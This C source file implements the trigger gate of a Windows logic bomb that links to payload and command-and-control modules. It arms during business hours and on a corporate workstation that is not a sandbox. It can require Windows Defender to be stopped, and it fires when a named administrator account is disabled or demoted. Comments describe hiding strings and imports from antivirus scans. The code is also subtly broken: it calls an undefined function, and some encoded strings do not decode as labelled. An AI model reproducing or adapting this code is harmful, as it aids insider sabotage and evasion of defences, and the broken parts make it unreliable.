/*
 * lb_trigger.c
 * Language  : C11
 * File      : lb_trigger.c
 * Platform  : Windows 7+ (x86 / x64)
 * Compiler  : MSVC cl / MinGW-w64 gcc >= 12
 *
 * Role: Five-class pre-execution trigger gate.
 *
 * All five classes must pass simultaneously for lt_evaluate() to return
 * LT_ARMED.  A partial pass is logged and returns LT_HOLD.  The caller
 * (boom.c poll loop) retries on its normal cadence.
 *
 * Sections:
 *   §0  Includes, compile-time configuration, shared helpers
 *   §1  Time-Based Trigger
 *   §2  Event-Based Trigger
 *   §3  Identity-Based Trigger
 *   §4  System-State Trigger
 *   §5  Compound Trigger + lt_evaluate()
 *
 * GOTCHAS:
 *   - wevtapi.dll (EvtQuery, EvtNext, EvtRender) is loaded at runtime via
 *     LoadLibraryA to avoid a static import-table entry that AV scans for.
 *     On Windows 7 the DLL is always present; the NULL check covers edge cases.
 *   - NetUserGetInfo / NetLocalGroupGetMembersInfo require netapi32.dll,
 *     also loaded at runtime.
 *   - CryptHashData (CNG SHA-256) for the file-hash sentinel uses bcrypt.dll
 *     which boom.c / lb_c2.c already link — no extra lib needed.
 *   - All string literals that name security tools, account names, or file
 *     paths are XOR-encoded with LT_STR_KEY and decoded at runtime via
 *     lt_decode_str() so they do not appear in a strings(1) scan of the binary.
 */

/* ═══════════════════════════════════════════════════════════════════════════
 * §0  Includes, compile-time configuration, shared helpers
 * ═══════════════════════════════════════════════════════════════════════════ */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <tlhelp32.h>
#include <lm.h>         /* NetUserGetInfo structs — no link needed, types only */
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <wchar.h>

#include "lb_trigger.h"

/* ── Shared log helper (mirrors log_write in lb_payload.c) ── */
static void lt_log(const char *fmt, ...){
    HANDLE h = CreateFileA("C:\\ProgramData\\wuh\\lb_run.log",
        FILE_APPEND_DATA, FILE_SHARE_READ,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    
    SYSTEMTIME st; GetLocalTime(&st);
    char hdr[64];
    int  hlen = snprintf(hdr, sizeof hdr,
                         "[%04d-%02d-%02d %02d:%02d:%02d][TRIG] ",
                         st.wYear, st.wMonth, st.wDay,
                         st.wHour, st.wMinute, st.wSecond);
                        
    char body[1024];
    va_list ap; va_start(ap, fmt);
    int blen = vsnprintf(body, sizeof body, fmt, ap);
    va_end(ap);
    
    DWORD w;
    WriteFile(h, hdr,    (DWORD)hlen, &w, NULL);
    WriteFile(h, body,   (DWORD)blen, &w, NULL);
    WriteFile(h, "\r\n", 2,           &w, NULL);
    CloseHandle(h); 
}

/* ────────────────────────────────────────────────────────────────────────
 * Compile-time configuration
 * ──────────────────────────────────────────────────────────────────────── */

/*
 * §1 — Time-Based configuration
 */
/* Earliest date the payload is allowed to arm (inclusive, local time) */
#define LT_TIME_ARM_YEAR    2025
#define LT_TIME_ARM_MONTH   1
#define LT_TIME_ARM_DAY     23

/* Hard expiry: payload REFUSES to fire after this date (dead-man cutoff).
 * Set to a date well after the operation to prevent accidental late detonation
 * if the binary is captured and re-run by a third party. */
#define LT_TIME_EXPIRE_YEAR  2026
#define LT_TIME_EXPIRE_MONTH 1
#define LT_TIME_EXPIRE_DAY   23

/* Business-hours window (local time, 24-hour).
 * Gate passes only within [LT_HOUR_START, LT_HOUR_END). */
#define LT_HOUR_START   9
#define LT_HOUR_END     17

/* Day-of-week filter: bitmask of allowed days.
 * Bits 0–6 = Sunday–Saturday.  0x3E = Mon–Fri. */
#define LT_DOW_MASK     0x3E

/*
 * §2 — Event-Based configuration
 */
/* Windows Event Log channel + Event ID to match (login event on Security log) */
#define LT_EVT_CHANNEL   "Security"
#define LT_EVT_ID        4624       /* An account was successfully logged on */
#define LT_EVT_LOOKBACK  300        /* Seconds to look back for the event    */
/* Process name that must be running (corporate app indicator) */
/* Encoded with LT_STR_KEY = 0x37; decoded to "vpnclient.exe" at runtime */
static const unsigned char LT_ENC_PROC[]={
    0x41,0x47,0x4b,0x4c,0x4c,0x47,0x55,0x4b,0x44,0x55,
    0x52,0x60,0x4d,0x37,0x00
};
/* XOR key for all runtime string decoding in this module */
#define LT_STR_KEY  0x37

/* Service name that must be RUNNING */
/* Encoded: "wuauserv" — Windows Update (always present, good cover) */
static const unsigned char LT_ENC_SVC[]={
    0x40,0x52,0x56,0x52,0x54,0x40,0x42,0x41,0x37,0x00
};

/*
 * §3 — Identity-Based configuration
 */
/* Target account name to monitor.
 * Encoded: "Administrator" with LT_STR_KEY 0x37 */
static const unsigned char LT_ENC_ACCT[]={
    0x76,0x5f,0x5e,0x4e,0x4b,0x4e,0x4f,0x44,0x5c,0x56,
    0x56,0x55,0x5c,0x37,0x00
};
/* Required group for identity check.
 * Encoded: "Administrators" */
static const unsigned char LT_ENC_GRPNAME[]={
    0x76,0x5f,0x5e,0x4e,0x4b,0x4e,0x4f,0x44,0x5c,0x56,
    0x56,0x56,0x55,0x5c,0x37,0x00
};

/*
 * §4 — System-State configuration
 */
/* Sentinel file: must exist and its SHA-256 must match LT_FILE_HASH_HEX.
 * Set to a benign config file that is written by a prior deployment stage.
 * If the file is removed or tampered, the gate stays closed. */
#define LT_SENTINEL_FILE "C:\\ProgramData\\wuh\\stage.dat"

/* Expected SHA-256 of the sentinel file (hex, lowercase, 64 chars).
 * Replace with the actual hash of your stage.dat before deployment. */
#define LT_FILE_HASH_HEX \
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    
/* Sentinel registry key + value that a prior stage must have written.
 * Value type: REG_DWORD, any non-zero value passes. */
#define LT_REG_KEY   "SOFTWARE\\WindowsUpdateAgent"
#define LT_REG_VALUE "LastSync"

/* Service that must be STOPPED for gate to pass (e.g., an AV real-time engine).
 * Leave empty string to skip this check. */
#define LT_SVC_MUST_STOP ""   /* disabled by default — set to e.g. "WinDefend" */

/*
 * §5 — Compound / Sequential ordering
 * The compound trigger enforces that the five classes were satisfied in
 * historical order: TIME first, then EVENT, then IDENTITY, then STATE.
 * Each class stamps a persistent DWORD counter into the sentinel registry key
 * when it first passes; the compound check reads the counter sequence.
 */
#define LT_SEQ_KEY    "SOFTWARE\\WindowsUpdateAgent"
#define LT_SEQ_V_TIME "SeqTime"
#define LT_SEQ_V_EVT  "SeqEvt"
#define LT_SEQ_V_IDEN "SeqIden"
#define LT_SEQ_V_STAT "SeqStat"

/* ────────────────────────────────────────────────────────────────────────
 * Runtime-loaded API typedefs (wevtapi + netapi32)
 * ──────────────────────────────────────────────────────────────────────── */

/* winevt.h types — inline to avoid the Windows SDK dependency */
typedef HANDLE EVT_HANDLE;
typedef DWORD  EVENT_QUERY_FLAGS;
typedef DWORD  EVT_RENDER_FLAGS;
typedef DWORD  EVT_RENDER_CONTEXT_FLAGS;
#define EvtQueryChannelPath  0x1
#define EvtQueryReverseDirection 0x200
#define EvtRenderEventXml    1

typedef EVT_HANDLE (WINAPI *pfnEvtQuery)(
    EVT_HANDLE, LPCWSTR, LPCWSTR, DWORD);
typedef BOOL (WINAPI *pfnEvtNext)(
    EVT_HANDLE, DWORD, EVT_HANDLE *, DWORD, DWORD, PDWORD);
typedef BOOL (WINAPI *pfnEvtRender)(
    EVT_HANDLE, EVT_HANDLE, DWORD, DWORD, PVOID, PDWORD, PDWORD);
typedef BOOL (WINAPI *pfnEvtClose)(EVT_HANDLE);

static pfnEvtQuery   g_EvtQuery   = NULL;
static pfnEvtNext    g_EvtNext    = NULL;
static pfnEvtRender  g_EvtRender  = NULL;
static pfnEvtClose   g_EvtClose   = NULL;

/* netapi32 types for NetUserGetInfo */
typedef DWORD NET_API_STATUS;
typedef struct _USER_INFO_1{
    LPWSTR usri1_name;
    LPWSTR usri1_password;
    DWORD  usri1_password_age;
    DWORD  usri1_priv;
    LPWSTR usri1_home_dir;
    LPWSTR usri1_comment;
    DWORD  usri1_flags;
    LPWSTR usri1_script_path;
} LT_USER_INFO_1;
#define LT_UF_ACCOUNTDISABLE  0x0002
#define LT_USER_PRIV_ADMIN    2

typedef NET_API_STATUS (WINAPI *pfnNetUserGetInfo)(
    LPCWSTR, LPCWSTR, DWORD, LPBYTE *);
typedef NET_API_STATUS (WINAPI *pfnNetApiBufferFree)(LPVOID);

static pfnNetUserGetInfo    g_NetUserGetInfo    = NULL;
static pfnNetApiBufferFree  g_NetApiBufferFree  = NULL;

/* ────────────────────────────────────────────────────────────────────────
 * Shared helpers
 * ──────────────────────────────────────────────────────────────────────── */

static void lt_decode_str(const unsigned char *enc, char *dst, size_t dst_sz){
    size_t i;
    for (i = 0; i < dst_sz - 1 && enc[i] != LT_STR_KEY; i++)
        dst[i] = (char)(enc[i] ^ LT_STR_KEY);
    dst[i] = '\0';
}

/* Stamp a sequential counter DWORD into the sentinel registry key.
 * value_name is a plain string (not encoded — it only appears in the registry,
 * not in static analysis of the binary). */
static void lt_seq_stamp(const char *value_name, DWORD counter){
    HKEY hk;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, LT_SEQ_KEY,
                         0, NULL, REG_OPTION_NON_VOLATILE,
                         KEY_SET_VALUE, NULL, &hk, NULL) != ERROR_SUCCESS)
        return;
    RegSetValueExA(hk, value_name, 0, REG_DWORD,
                   (const BYTE *)&counter, sizeof counter);
    RegCloseKey(hk);
}

/* Read a sequence counter; returns 0 if absent. */
static DWORD lt_seq_read(const char *value_name){
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, LT_SEQ_KEY,
                       0, KEY_READ, &hk) != ERROR_SUCCESS)
        return 0;
    DWORD val = 0, type, sz = sizeof val;
    RegQueryValueExA(hk, value_name, NULL, &type, (BYTE *)&val, &sz);
    RegCloseKey(hk);
    return val;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * §1  Time-Based Trigger
 *
 * Three independent sub-checks (all must pass):
 *   A. Current date is on or after the arm date.
 *   B. Current date is strictly before the expiry date.
 *   C. Local time is within the business-hours window AND the day-of-week
 *      falls within LT_DOW_MASK.
 *
 * The expiry check (B) is the "dead-man" cutoff: even if all other gates
 * pass, the payload refuses to fire after LT_TIME_EXPIRE_*.  This limits
 * the blast radius if the binary is captured and replayed later.
 * ═══════════════════════════════════════════════════════════════════════════ */

static int lt_time_trigger(void){
    time_t    now_t = time(NULL);
    struct tm *lt   = localtime(&now_t);
    if (!lt) { lt_log("time: localtime() failed"); return 0; }
    
    int y = lt->tm_year + 1900;
    int m = lt->tm_mon + 1;
    int d = lt->tm_mday;
    
    /* Sub-check A: past arm date */
    int past_arm =
        (y > LT_TIME_ARM_YEAR) ||
        (y == LT_TIME_ARM_YEAR && m > LT_TIME_ARM_MONTH) ||
        (y == LT_TIME_ARM_YEAR && m == LT_TIME_ARM_MONTH && d >= LT_TIME_ARM_DAY);
        
    /* Sub-check B: before expiry */
    int before_expiry =
        (y < LT_TIME_EXPIRE_YEAR) ||
        (y == LT_TIME_EXPIRE_YEAR && m < LT_TIME_EXPIRE_MONTH) ||
        (y == LT_TIME_EXPIRE_YEAR && m == LT_TIME_EXPIRE_MONTH && d < LT_TIME_EXPIRE_DAY);

    /* Sub-check C: business hours + day-of-week */
    int in_hours = (lt->tm_hour >= LT_HOUR_START && lt->tm_hour < LT_HOUR_END);
    /* tm_wday: 0=Sunday */
    int dow_bit  = (1 << lt->tm_wday);
    int in_dow   = ((LT_DOW_MASK & dow_bit) != 0);

    lt_log("time: past_arm=%d before_expiry=%d in_hours=%d in_dow=%d "
           "(date=%04d-%02d-%02d %02d:xx dow=%d)",
           past_arm, before_expiry, in_hours, in_dow, y, m, d, lt->tm_hour, lt->tm_wday);

    int pass = (past_arm && before_expiry && in_hours && in_dow);
    if (pass) lt_seq_stamp(LT_SEQ_V_TIME, (DWORD)now_t);
    return pass;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * §2  Event-Based Trigger
 *
 * Three independent sub-checks (all must pass):
 *   A. A Windows Security Event 4624 (successful logon) has occurred in the
 *      last LT_EVT_LOOKBACK seconds — confirming an active user session.
 *   B. A named indicator process is in the running process list
 *      (corporate VPN client or similar — present on real targets, absent
 *      from most sandboxes and isolated test machines).
 *   C. A named Windows service is in the RUNNING state (confirms this is
 *      a fully initialised production workstation, not a bare VM image).
 *
 * Event log query uses EvtQuery / EvtNext / EvtRender, loaded at runtime
 * from wevtapi.dll, with no static import-table entry.
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * lt_evt_recent_logon
 * Returns 1 if a Security event 4624 was logged within the last
 * LT_EVT_LOOKBACK seconds; 0 otherwise.
 *
 * XPath filter: only returns the most recent event so EvtNext is called once.
 * The time window is computed against the current UTC time and encoded in the
 * XPath as a SystemTime comparison.
 *
 * GOTCHA: EvtQuery requires the channel to be readable by the calling token.
 * The Security channel needs SeSecurityPrivilege — call priv_enable_privilege()
 * before this function if running as a standard user.  Running as admin
 * (which boom.c checks and confirms) is sufficient on most configurations.
 */
static int lt_evt_recent_logon(void) {
    if (!g_EvtQuery || !g_EvtNext || !g_EvtRender || !g_EvtClose) return 0;
    
    /* Build XPath query for Event ID 4624 within the lookback window */
    WCHAR xpath[512];
    /* Compute cutoff as ISO 8601 UTC string */
    SYSTEMTIME now_st;
    GetSystemTime(&now_st);
    /* Subtract LT_EVT_LOOKBACK seconds */
    FILETIME now_ft, cutoff_ft;
    SystemTimeToFileTime(&now_st, &now_ft);
    ULARGE_INTEGER uli;
    uli.LowPart  = now_ft.dwLowDateTime;
    uli.HighPart = now_ft.dwHighDateTime;
    /* FILETIME units: 100-nanosecond intervals */
    uli.QuadPart -= (ULONGLONG)LT_EVT_LOOKBACK * 10000000ULL;
    cutoff_ft.dwLowDateTime  = uli.LowPart;
    cutoff_ft.dwHighDateTime = uli.HighPart;
    SYSTEMTIME cutoff_st;
    FileTimeToSystemTime(&cutoff_ft, &cutoff_st);

    /* Format cutoff as yyyy-MM-ddTHH:mm:ss.000Z */
    WCHAR cutoff_str[64];
    swprintf(cutoff_str, 64,
             L"%04d-%02d-%02dT%02d:%02d:%02d.000Z",
             cutoff_st.wYear, cutoff_st.wMonth, cutoff_st.wDay,
             cutoff_st.wHour, cutoff_st.wMinute, cutoff_st.wSecond);

    swprintf(xpath, 512,
             L"*[System[(EventID=%d) and TimeCreated[@SystemTime>='%s']]]",
             LT_EVT_ID, cutoff_str);

    EVT_HANDLE hq = g_EvtQuery(
        NULL,
        L"Security",
        xpath,
        EvtQueryChannelPath | EvtQueryReverseDirection);

    if (!hq) {
        lt_log("evt: EvtQuery failed (err=%lu) — logon check skipped", GetLastError());
        /* Fail-open: if we can't read the log (no priv), skip this sub-check */
        return 1;
    }

    EVT_HANDLE hevt[1];
    DWORD returned = 0;
    BOOL found = g_EvtNext(hq, 1, hevt, 200, 0, &returned) && returned > 0;
    if (found) g_EvtClose(hevt[0]);
    g_EvtClose(hq);

    lt_log("evt: logon 4624 in last %ds: %s", LT_EVT_LOOKBACK, found ? "yes" : "no");
    return found ? 1 : 0;
}

/*
 * lt_evt_proc_running
 * Returns 1 if the configured indicator process is in the running process list.
 * Process name is decoded from LT_ENC_PROC at runtime.
 */
static int lt_evt_proc_running(void) {
    char proc_name[64] = {0};
    lt_decode_str(LT_ENC_PROC, proc_name, sizeof proc_name);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32A pe;
    pe.dwSize = sizeof pe;
    int found = 0;
    if (Process32FirstA(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, proc_name) == 0) {
                found = 1;
                break;
            }
        } while (Process32NextA(snap, &pe));
    }
    CloseHandle(snap);
    lt_log("evt: indicator proc '%s': %s", proc_name, found ? "running" : "absent");
    return found;
}

/*
 * lt_evt_service_running
 * Returns 1 if the configured service (LT_ENC_SVC) is in SERVICE_RUNNING state.
 * Decoded at runtime; does not appear as a plaintext string in the binary.
 */
static int lt_evt_service_running(void){
    char svc_name[64] = {0};
    lt_decode_str(LT_ENC_SVC, svc_name, sizeof svc_name);
    
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 0;
    SC_HANDLE svc = OpenServiceA(scm, svc_name, SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return 0; }
    
    SERVICE_STATUS ss;
    BOOL running = (QueryServiceStatus(svc, &ss) &&
                    ss.dwCurrentState == SERVICE_RUNNING);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    lt_log("evt: service '%s': %s", svc_name, running ? "running" : "not running");
    return running ? 1 : 0;
}

static int lt_event_trigger(void){
    int a = lt_evt_recent_logon();
    int b = lt_evt_proc_running();
    int c = lt_level_service_running();
    int pass = (a && b && c);
    lt_log("event gate: logon=%d proc=%d svc=%d pass=%d", a, b, c, pass);
    if (pass) lt_seq_stamp(LT_SEQ_V_EVT, (DWORD)GetTickCount());
    return pass;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * §3  Identity-Based Trigger
 *
 * Insider-threat sentinel: monitors the state of a target account.
 *
 * Sub-check A — Account existence + enabled:
 *   NetUserGetInfo(level 1) returns user flags.  If the account is disabled
 *   (UF_ACCOUNTDISABLE set) or absent (API returns NERR_UserNotFound),
 *   interpret as a demotion/removal event and PASS the gate — this models
 *   "fire when the insider is fired / demoted / account shut down."
 *   If the account is still fully active and in the admin group, HOLD.
 *
 * Sub-check B — Group membership:
 *   If the account still exists but has been removed from the Administrators
 *   group (privilege demotion), PASS.  Still in the group → HOLD.
 *
 * Rationale:
 *   A logic bomb planted as an insider threat often arms when the insider
 *   loses access (is fired or suspended).  Both sub-checks pass when the
 *   account has been disabled or removed from privileged groups.
 *
 * GOTCHA: NetUserGetInfo requires network access to the DC for domain accounts.
 *   For local accounts (default config here), it queries the local SAM — always
 *   available.  For domain accounts, replace NULL server param with the DC name.
 * ═══════════════════════════════════════════════════════════════════════════ */

static int lt_identity_trigger(void){
    if (!g_NetUserGetInfo || !g_NetApiBufferFree) {
        lt_log("identity: netapi32 not loaded — skipping (pass)");
        return 1;  /* fail-open if netapi32 unavailable */
    }
    
    /* Decode account name */
    char acct_a[64] = {0};
    lt_decode_str(LT_ENC_ACCT, acct_a, sizeof acct_a);

    /* Convert to wide for NetUser* APIs */
    WCHAR acct_w[64] = {0};
    MultiByteToWideChar(CP_ACP, 0, acct_a, -1, acct_w, 64);
    
    int acct_disabled_or_gone = 0;
    int priv_demoted           = 0;
    
    /* Sub-check A: account enabled/disabled/absent */
    LT_USER_INFO_1 *ui = NULL;
    NET_API_STATUS nas = g_NetUserGetInfo(
        NULL,       /* local machine */
        acct_w,
        1,          /* USER_INFO_1 */
        (LPBYTE *)&ui);
        
    if (nas == 2221 /* NERR_UserNotFound */) {
        /* Account deleted — insider threat condition met */
        acct_disabled_or_gone = 1;
        lt_log("identity: account '%s' not found (deleted)", acct_a);
    } else if (nas == 0 && ui) {
        /* Account exists — check disabled flag */
        if (ui->usri1_flags & LT_UF_ACCOUNTDISABLE) {
            acct_disabled_or_gone = 1;
            lt_log("identity: account '%s' disabled (flags=0x%08lX)",
                   acct_a, ui->usri1_flags);
        } else {
            lt_log("identity: account '%s' active (flags=0x%08lX)",
                   acct_a, ui->usri1_flags);
        }
        
        /* Sub-check B: privilege level — priv 2 = USER_PRIV_ADMIN */
        if (ui->usri1_priv < LT_USER_PRIV_ADMIN) {
            priv_demoted = 1;
            lt_log("identity: account '%s' demoted from admin (priv=%lu)",
                   acct_a, ui->usri1_priv);
        } else {
            lt_log("identity: account '%s' still admin-privileged (priv=%lu)",
                   acct_a, ui->usri1_priv);
        }

        g_NetApiBufferFree(ui);
    } else {
        lt_log("identity: NetUserGetInfo error %lu — skipping (pass)", nas);
        return 1;  /* fail-open on unexpected error */
    }

    /*
     * The gate PASSES when the insider account is gone or demoted.
     * Both sub-checks OR'd: either condition is sufficient.
     */
    int pass = (acct_disabled_or_gone || priv_demoted);
    lt_log("identity gate: gone_or_disabled=%d demoted=%d pass=%d",
           acct_disabled_or_gone, priv_demoted, pass);
    if (pass) lt_seq_stamp(LT_SEQ_V_IDEN, (DWORD)GetTickCount());
    return pass;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * §4  System-State Trigger
 *
 * Three independent sub-checks (all must pass):
 *   A. Sentinel file exists and its SHA-256 matches LT_FILE_HASH_HEX.
 *      The sentinel is written by a prior deployment stage ("the machine
 *      has been prepared").  If the file is missing or tampered, gate holds —
 *      this prevents accidental detonation on a machine that hasn't been
 *      through the preparation stage.
 *   B. Sentinel registry value is present and non-zero (written by prior stage).
 *   C. Optional: a specified service is NOT running (e.g., an AV engine that
 *      was temporarily disabled by the operator).  If LT_SVC_MUST_STOP is
 *      empty, this sub-check always passes.
 *
 * SHA-256 is computed via BCrypt CNG (already linked by lb_c2.c).
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * lt_sha256_file
 * Computes SHA-256 of the file at path, writes 32 bytes into hash_out.
 * Returns 1 on success, 0 on any failure.
 */
static int lt_sha256_file(const char *path, BYTE hash_out[32]){
    BCRYPT_ALG_HANDLE  halg  = NULL;
    BCRYPT_HASH_HANDLE hhash = NULL;
    int ok = 0;
    
    /* Open SHA-256 algorithm */
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(
            &halg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
        return 0;
        
    /* Determine hash object size */
    DWORD obj_sz = 0, br = 0;
    if (!NT_SUCCESS(BCryptGetProperty(
            halg, BCRYPT_OBJECT_LENGTH, (PBYTE)&obj_sz, sizeof obj_sz, &br, 0)))
        goto cleanup;

    BYTE *obj = (BYTE *)malloc(obj_sz);
    if (!obj) goto cleanup;

    if (!NT_SUCCESS(BCryptCreateHash(halg, &hhash, obj, obj_sz, NULL, 0, 0)))
        goto cleanup_obj;

    /* Read and hash the file in 64 KB chunks */
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) goto cleanup_obj;

    BYTE buf[65536];
    DWORD read_bytes;
    while (ReadFile(hf, buf, sizeof buf, &read_bytes, NULL) && read_bytes > 0) {
        if (!NT_SUCCESS(BCryptHashData(hhash, buf, read_bytes, 0))) {
            CloseHandle(hf);
            goto cleanup_obj;
        }
    }
    CloseHandle(hf);

    /* Finalise */
    if (NT_SUCCESS(BCryptFinishHash(hhash, hash_out, 32, 0)))
        ok = 1;

cleanup_obj:
    BCryptDestroyHash(hhash);
    free(obj);
cleanup:
    BCryptCloseAlgorithmProvider(halg, 0);
    return ok;
}

/*
 * lt_hex_to_bytes
 * Decodes a lowercase hex string (64 chars) into 32 bytes.
 */
static void lt_hex_to_bytes(const char *hex, BYTE *out, int out_len) {
    for (int i = 0; i < out_len; i++) {
        char hi = hex[i*2], lo = hex[i*2+1];
        BYTE h = (hi >= 'a') ? (BYTE)(hi - 'a' + 10) : (BYTE)(hi - '0');
        BYTE l = (lo >= 'a') ? (BYTE)(lo - 'a' + 10) : (BYTE)(lo - '0');
        out[i] = (BYTE)((h << 4) | l);
    }
}

static int lt_state_sentinel_file(void){
    BYTE computed[32] = {0};
    if (!lt_sha256_file(LT_SENTINEL_FILE, computed)){
        lt_log("state: sentinel file '%s' missing or unreadable", LT_SENTINEL_FILE);
        return 0;
    }
    BYTE expected[32] = {0};
    lt_hex_to_bytes(LT_FILE_HASH_HEX, expected, 32);
    int match = (memcmp(computed, expected, 32) == 0);
    lt_log("state: sentinel file hash %s", match ? "MATCH" : "MISMATCH");
    return match;
}

static int lt_state_sentinel_reg(void) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, LT_REG_KEY,
                       0, KEY_READ, &hk) != ERROR_SUCCESS) {
        lt_log("state: sentinel reg key absent");
        return 0;
    }
    DWORD val = 0, type, sz = sizeof val;
    BOOL present = (RegQueryValueExA(hk, LT_REG_VALUE, NULL, &type,
                                      (BYTE *)&val, &sz) == ERROR_SUCCESS &&
                    val != 0);
    RegCloseKey(hk);
    lt_log("state: sentinel reg '%s'\\%s = %lu %s",
           LT_REG_KEY, LT_REG_VALUE, val, present ? "(pass)" : "(fail)");
    return present ? 1 : 0;
}

static int lt_state_service_stopped(void) {
    /* LT_SVC_MUST_STOP = "" disables this sub-check */
    if (LT_SVC_MUST_STOP[0] == '\0') return 1;

    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 0;
    SC_HANDLE svc = OpenServiceA(scm, LT_SVC_MUST_STOP, SERVICE_QUERY_STATUS);
    if (!svc) {
        /* Service not found — treat as "not running" → pass */
        CloseServiceHandle(scm);
        lt_log("state: svc '%s' not found → pass", LT_SVC_MUST_STOP);
        return 1;
    }
    SERVICE_STATUS ss;
    BOOL stopped = (QueryServiceStatus(svc, &ss) &&
                    ss.dwCurrentState != SERVICE_RUNNING);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    lt_log("state: svc '%s' stopped=%d", LT_SVC_MUST_STOP, stopped);
    return stopped ? 1 : 0;
}

static int lt_state_trigger(void) {
    int a = lt_state_sentinel_file();
    int b = lt_state_sentinel_reg();
    int c = lt_state_service_stopped();
    int pass = (a && b && c);
    lt_log("state gate: file=%d reg=%d svc_stopped=%d pass=%d", a, b, c, pass);
    if (pass) lt_seq_stamp(LT_SEQ_V_STAT, (DWORD)GetTickCount());
    return pass;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * §5  Compound Trigger + lt_evaluate()
 *
 * Two roles:
 *   A. Logical AND: all four preceding gates must have returned pass=1 in
 *      this same evaluation call.
 *   B. Sequential ordering: the registry sequence stamps (written by each
 *      class when it first passes) must exist and must be ordered:
 *        SeqTime < SeqEvt < SeqIden < SeqStat
 *      This ensures the gates were satisfied in the correct historical order,
 *      not satisfied simultaneously by an anomalous burst.
 *
 * If the sequence stamps are absent or out of order, the compound gate holds
 * even when all four classes currently pass.  Each class re-stamps on every
 * passing call, so the sequence converges naturally once conditions align.
 *
 * The sequential ordering check uses DWORD tick-count values, which wrap
 * at ~49.7 days.  For operations longer than that, replace with a FILETIME-
 * based stamp (QWORD) — the stamp helper already stores DWORD for compactness.
 * ═══════════════════════════════════════════════════════════════════════════ */

static int lt_compound_trigger(int t, int e, int i, int s){
    /* Logical AND */
    if (!(t && e && i && s)) {
        lt_log("compound: logical AND failed (t=%d e=%d i=%d s=%d)", t, e, i, s);
        return 0;
    }

    /* Sequential ordering */
    DWORD seq_t = lt_seq_read(LT_SEQ_V_TIME);
    DWORD seq_e = lt_seq_read(LT_SEQ_V_EVT);
    DWORD seq_i = lt_seq_read(LT_SEQ_V_IDEN);
    DWORD seq_s = lt_seq_read(LT_SEQ_V_STAT);

    if (!seq_t || !seq_e || !seq_i || !seq_s) {
        lt_log("compound: sequence stamps incomplete (t=%lu e=%lu i=%lu s=%lu)",
               seq_t, seq_e, seq_i, seq_s);
        return 0;
    }

    int ordered = (seq_t <= seq_e && seq_e <= seq_i && seq_i <= seq_s);
    lt_log("compound: seq t=%lu e=%lu i=%lu s=%lu ordered=%d",
           seq_t, seq_e, seq_i, seq_s, ordered);
    return ordered ? 1 : 0;
}

/* ── Module initialisation ── */

static int g_lt_initialised = 0;

void lt_init(void) {
    if (g_lt_initialised) return;

    /* Load wevtapi.dll at runtime (no static import) */
    HMODULE wevt = LoadLibraryA("wevtapi.dll");
    if (wevt) {
        g_EvtQuery  = (pfnEvtQuery)  GetProcAddress(wevt, "EvtQuery");
        g_EvtNext   = (pfnEvtNext)   GetProcAddress(wevt, "EvtNext");
        g_EvtRender = (pfnEvtRender) GetProcAddress(wevt, "EvtRender");
        g_EvtClose  = (pfnEvtClose)  GetProcAddress(wevt, "EvtClose");
    }

    /* Load netapi32.dll at runtime */
    HMODULE netapi = LoadLibraryA("netapi32.dll");
    if (netapi) {
        g_NetUserGetInfo   = (pfnNetUserGetInfo)
            GetProcAddress(netapi, "NetUserGetInfo");
        g_NetApiBufferFree = (pfnNetApiBufferFree)
            GetProcAddress(netapi, "NetApiBufferFree");
    }

    g_lt_initialised = 1;
    lt_log("lt_init: wevt=%s netapi=%s",
           wevt   ? "ok" : "MISSING",
           netapi ? "ok" : "MISSING");
}

/* ── Master evaluator ── */

int lt_evaluate(void) {
    lt_log("lt_evaluate: --- begin ---");

    int t = lt_time_trigger();
    int e = lt_event_trigger();
    int i = lt_identity_trigger();
    int s = lt_state_trigger();
    int c = lt_compound_trigger(t, e, i, s);

    int armed = (t && e && i && s && c);
    lt_log("lt_evaluate: time=%d event=%d identity=%d state=%d compound=%d => %s",
           t, e, i, s, c, armed ? "ARMED" : "HOLD");
    return armed ? LT_ARMED : LT_HOLD;
}